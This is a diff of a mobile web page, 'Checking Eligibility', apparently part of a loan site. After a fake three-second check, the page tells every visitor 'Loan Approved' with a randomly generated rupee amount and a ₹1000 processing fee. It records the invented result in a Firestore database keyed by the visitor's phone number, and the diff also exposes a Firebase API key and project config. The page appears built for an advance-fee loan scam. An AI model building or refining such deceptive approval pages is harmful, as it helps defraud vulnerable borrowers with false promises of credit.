@@ -1,16 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
+
 <title>Checking Eligibility</title>
 
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
 
 <style>
 
 body{
 margin:0;
 padding:0;
-background:#f3f3f3;
+background:#eef2f7;
 font-family:sans-serif;
 display:flex;
 justify-content:center;
@@ -21,17 +23,17 @@ height:100vh;
 .box{
 text-align:center;
 background:white;
-padding:40px 30px;
-border-radius:25px;
-box-shadow:0 10px 30px rgba(0,0,0,0.1);
+padding:45px 30px;
+border-radius:30px;
+box-shadow:0 10px 30px rgba(0,0,0,0.08);
 width:85%;
-max-width:350px;
+max-width:380px;
 }
 
 .loader{
-width:80px;
-height:80px;
-border:10px solid #ddd;
+width:90px;
+height:90px;
+border:10px solid #e5e5e5;
 border-top:10px solid #ffd500;
 border-radius:50%;
 animation:spin 1s linear infinite;
@@ -39,53 +41,65 @@ margin:auto;
 }
 
 @keyframes spin{
+
 100%{
 transform:rotate(360deg);
 }
+
 }
 
 h2{
-margin-top:30px;
-font-size:28px;
+margin-top:35px;
+font-size:34px;
+color:#111;
 }
 
 p{
-margin-top:10px;
-font-size:18px;
+margin-top:12px;
+font-size:20px;
 color:#666;
 }
 
 .amount-box{
-margin-top:30px;
-background:#f9f9f9;
-padding:20px;
-border-radius:20px;
+margin-top:35px;
+background:#f8fafc;
+padding:25px;
+border-radius:25px;
 }
 
 .big-amount{
-font-size:48px;
+font-size:54px;
 font-weight:bold;
 color:green;
 margin-top:10px;
 }
 
 .info{
-margin-top:20px;
-font-size:22px;
-line-height:45px;
+margin-top:25px;
+font-size:24px;
+line-height:50px;
 text-align:left;
+color:#222;
 }
 
 button{
 width:100%;
-height:60px;
+height:70px;
 border:none;
 background:#ffd500;
-font-size:24px;
+font-size:28px;
 font-weight:bold;
-border-radius:18px;
-margin-top:30px;
+border-radius:22px;
+margin-top:35px;
 cursor:pointer;
+color:#111;
+}
+
+.success{
+font-size:22px;
+color:green;
+margin-top:15px;
+font-weight:bold;
 }
 
 </style>
@@ -94,26 +108,66 @@ cursor:pointer;
 
 <body>
 
-<div class="box" id="mainBox">
+<div class="box"
+id="mainBox">
 
 <div class="loader"></div>
 
-<h2>Checking Your Eligibility...</h2>
+<h2>
+Checking Your Eligibility...
+</h2>
 
-<p>Please wait...</p>
+<p>
+Please wait...
+</p>
 
 </div>
 
-<script>
+<script type="module">
 
-setTimeout(function(){
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
-let randomAmount = Math.floor(
+import {
+getFirestore,
+doc,
+setDoc
+}
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyCajHdn60cCNoivFXrpPOh0xRNRY_rinMQ",
+
+authDomain: "loan-19007.firebaseapp.com",
+
+projectId: "loan-19007",
+
+storageBucket: "loan-19007.appspot.com",
+
+messagingSenderId: "175686513150",
+
+appId: "1:175686513150:web:f25e43507db445998d10af"
+
+};
+
+const app =
+initializeApp(firebaseConfig);
+
+const db =
+getFirestore(app);
+
+setTimeout(async function(){
+
+let randomAmount =
+Math.floor(
 Math.random() * 400000
 ) + 100000;
 
 randomAmount =
-Math.round(randomAmount / 10000) * 10000;
+Math.round(
+randomAmount / 10000
+) * 10000;
 
 let fee = 1000;
 
@@ -140,9 +194,36 @@ localStorage.setItem(
 randomAmount
 );
 
-document.getElementById("mainBox").innerHTML = `
+localStorage.setItem(
+"processingFee",
+fee
+);
 
-<h2>Congratulations!</h2>
+let phone =
+localStorage.getItem(
+"customerPhone"
+);
+
+await setDoc(
+doc(db,"loanApplications",phone),
+{
+
+loanAmount:randomAmount,
+processingFee:fee,
+interest:"2.5%",
+status:"Eligible"
+
+},
+{merge:true}
+);
+
+document.getElementById(
+"mainBox"
+).innerHTML = `
+
+<h2>
+🎉 Congratulations!
+</h2>
 
 <div class="amount-box">
 
@@ -150,6 +231,10 @@ document.getElementById("mainBox").innerHTML = `
 ₹${randomAmount.toLocaleString()}
 </div>
 
+</div>
+
+<div class="success">
+✅ Loan Approved
 </div>
 
 <div class="info">
@@ -166,17 +251,18 @@ Processing Fee :
 </div>
 
 <button onclick="applyLoan()">
-Apply Loan
+Apply Loan →
 </button>
 
 `;
 
 },3000);
 
-function applyLoan(){
+window.applyLoan =
+function(){
 
 window.location.href =
-"pending-status.html";
+"loan-calculator.html";
 
 }
 
